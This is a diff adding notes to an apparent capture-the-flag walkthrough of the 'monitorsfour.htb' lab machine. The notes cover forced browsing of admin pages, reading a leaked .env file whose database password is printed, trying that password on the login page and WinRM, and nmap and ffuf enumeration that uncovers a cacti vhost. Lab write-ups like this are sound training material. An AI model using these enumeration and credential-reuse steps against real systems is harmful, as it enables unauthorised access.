@@ -148,9 +148,244 @@ T       96l      239w     4340c http://monitorsfour.htb/views/login.php
 
 
 
+lets recap, Error disclosure (full filesystem paths, router file/line numbers).
+Direct access to /views/* and /views/admin/*
+WinRM on 5985
+
+
+
+lets go through http://monitorsfour.htb/views/admin/users.php & http://monitorsfour.htb/views/admin/api.php 
+
+once we pull them up we can see that admin pages are accessible without a session, we only used feroxbuster and even then without feroxbuster, the inspect element on the webpages would have presented these vulnerabilities 
+
+
+
+http://monitorsfour.htb/views/admin/users.php -> gives us a page, -> Main
+Dashboard
+Tasks & Invoicing
+Tasks
+Invoices
+Customer & User Management
+Users
+Customers
+Changelogs
+Changelog
+API
+Generate API Key
+Home
+Users
+Users
+Add User 
+
+then http://monitorsfour.htb/views/admin/api.php -> 
+
+Main
+Dashboard
+Tasks & Invoicing
+Tasks
+Invoices
+Customer & User Management
+Users
+Customers
+Changelogs
+Changelog
+API
+Generate API Key
+Home
+API Keys
+API Key Management
+Generate and manage your personal API key for automation purposes.
+
+Generate New API Key
+
+
+all bad for them, good for us. 
+we might be able to add in a user, and generate an API key all without creating a login, 
+
+lets try for both, without burpsuite, lets inspect -> network 
+
+http://monitorsfour.htb/views/admin/api.php -> Generate API Key -> http://monitorsfour.htb/login 
+
+http://monitorsfour.htb/views/admin/users.php -> Add User -> Warning: Undefined variable $superuser in /var/www/app/views/admin/users.php on line 44
+#	Username	Name	Position	D.O.B	Start Date	Salary
+No users found.
+Add User -> empty fields to add in a user, 
+
+
+Direct forced-browsing to /views/admin/* still works, but any “real” privileged action you click (Generate API Key) is routed to /login, 
+meaning the backend action endpoint is enforcing auth but the /view itself isn’t.
+
+lets do an html dump, curl -s http://monitorsfour.htb/views/admin/users.php | sed -n '1,200p'
+
+we get good results -> 
+
+/admin/dashboard
+
+/admin/tasks
+
+/admin/invoices
+
+/admin/users
+
+/admin/customers
+
+/admin/changelog
+
+/admin/api
+
+So /views/admin/users.php is basically a template, but the intended entrypoints are the /admin/* routes.
+
+
+sooo forced-browsing bypass is possible, but so far all actions are gated 
+
+
+
+------------------
+
+
+Request URL http://monitorsfour.htb/api/v1/auth Request Method POST Status Code 302 
+Found Remote Address hmmm when we try to add a user with that role, with a simple name and password, 
+then we go to login, typed that in we get a Invalid credentials, check your username and password then try again!
+
+What this tells us ---> 
+
+/api/v1/auth is authentication only
+
+soooo  ---->
+
+add user UI did not create a user
+backend correctly enforces auth on /api/v1/auth
+
+The “Add User” modal is purely cosmetic when accessed via forced browsing 
+
+so this was a good misdirection, we like this box, lets look for config / env files now 
+
+curl -i http://monitorsfour.htb/controllers/ HTTP/1.1 403 Forbidden Server: 
+
+nginx Date: Sun, 14 Dec 2025 00:06:30 GMT Content-Type: text/html Content-Length: 146 Connection: keep-alive
+
+
+----> nothing 
+
+curl -i http://monitorsfour.htb/.env HTTP/1.1 200 OK Server: nginx Date: Sun, 14 Dec 2025 00:07:18 GMT Content-Type: application/octet-stream Content-Length: 97 
+Last-Modified: Sat, 13 Sep 2025 05:37:28 GMT Connection: keep-alive ETag: "68c50318-61" 
+Accept-Ranges: bytes DB_HOST=mariadb DB_PORT=3306 DB_NAME=monitorsfour_db DB_USER=monitorsdbuser DB_PASS=f37p2j8f4t0r 
+
+
+wow look at that!!! a simple curl and we get something very good, we found the intended pivot. Critical find!
+
+DB_HOST=mariadb
+DB_PORT=3306
+DB_NAME=monitorsfour_db
+DB_USER=monitorsdbuser
+DB_PASS=f37p2j8f4t0r
+
+
+lets try the login page and test the following
+
+Username: monitorsdbuser & Password: f37p2j8f4t0r 
+
+---------------> Invalid credentials, check your username and password then try again!
+
+so thats not the right place, hmmm remmeber that port? Port 5985/tcp is open — WinRM (Microsoft HTTPAPI 2.0) 
+
+we try again here and it doesnt work either -----> 
+
+These are database-only credentials, not OS or app-login creds. 
+
+MariaDB is internal-only (expected) ----> DB port 3306 is not exposed ----------->>> So the DB creds must be abused through the app
+
+That means the next step is data extraction, not auth guessing. -----------> 
+
+
+hmmmmm,  
+
+nmap -p 3306 -Pn monitorsfour.htb                     
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 18:21 CST
+Nmap scan report for monitorsfour.htb (10.129.6.1)
+Host is up.
+
+PORT     STATE    SERVICE
+3306/tcp filtered mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds 
+
+
+
+hmmmmm,
+
+curl -i -X POST http://monitorsfour.htb/api/v1/auth \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "username=test&password=test"
+
+HTTP/1.1 302 Found
+Server: nginx
+Date: Sun, 14 Dec 2025 00:22:01 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.3.27
+Set-Cookie: PHPSESSID=ba0449c9d7ee317a40ed7fa3510cd8d5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login
+
+
+
+sooo thats why we cannot connect directly, ---->  3306/tcp filtered mysql --->  there’s no direct DB access --->  no “easy SQLi on login” path. ---> well then lol 
+
+
+we try for LFI but find nothing, 
+
+
+hmmmm, lets try some more fuffing, admittly, here to make this shortwe we will only place the one that found us the next step, but in reality this took me longer than I care to admit 
+
+ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.monitorsfour.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3
+________________________________________________
+
+:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: 
+Erro:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [49/19966] :: Job [1/1] :: 0 req/sec :: 
+
+Duration: [0:00:00] :: Erro:: Progress: [73/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [104/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: 
+
+Err:: Progress: [143/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [172/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [192/19966] :: Job [1/1] :: 234 req/sec :: Duration: [0:00:01] :: 
+
+E:: Progress: [222/19966] :: Job [1/1] :: 236 req/sec :: Duration: [0:00:01] :: E:: Progress: [260/19966] :: Job [1/1] :: 242 req/sec :: Duration: [0:00:01] :: E:: Progress: [286/19966] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:01] 
+
+:: Ecacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 232ms]
 
 
 
 
+------------------- :: Ecacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 232ms]
+ we found something!!! 
 
+A virtual host named ecacti.monitorsfour.htb exists!!!
+
+Add the vhost to /etc/hosts
+
+echo "10.129.6.1 ecacti.monitorsfour.htb" | sudo tee -a /etc/hosts
 
